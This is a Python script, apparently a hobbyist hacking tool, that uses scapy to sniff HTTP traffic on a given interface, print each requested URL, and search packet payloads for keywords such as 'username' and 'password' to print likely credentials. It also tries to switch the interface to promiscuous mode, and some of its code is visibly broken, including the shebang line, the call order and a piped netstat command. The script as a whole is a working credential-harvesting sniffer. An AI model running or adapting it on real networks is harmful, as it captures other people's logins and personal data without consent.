#!usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import subprocess
import argparse


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "email", "password", "pass", "phone"]
        for keyword in keywords:
            if keyword in str(load):
                return str(load)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))
        pass_user = login_info(packet)
        if pass_user:
            print("\n\n[+] Possible Username/Password " + pass_user + "\n\n")


def Monitor_mode_on(interface):
    subprocess.call(["ip", "link", "set", interface, "promisc", "on"])
    subprocess.call(["ifconfig", interface, "promisc"])
    print("[+] Verifing")
    subprocess.check_output(["netstat", "-i", "|", "grep", "-i", "\"", interface, "\""])


def argument():
    par = argparse.ArgumentParser()
    par.add_argument("-i", "--interface", dest="interface", help="Interface of Network")
    options = par.parse_args()
    return options.interface


inter_face = argument()
sniffer(inter_face)
Monitor_mode_on(inter_face)
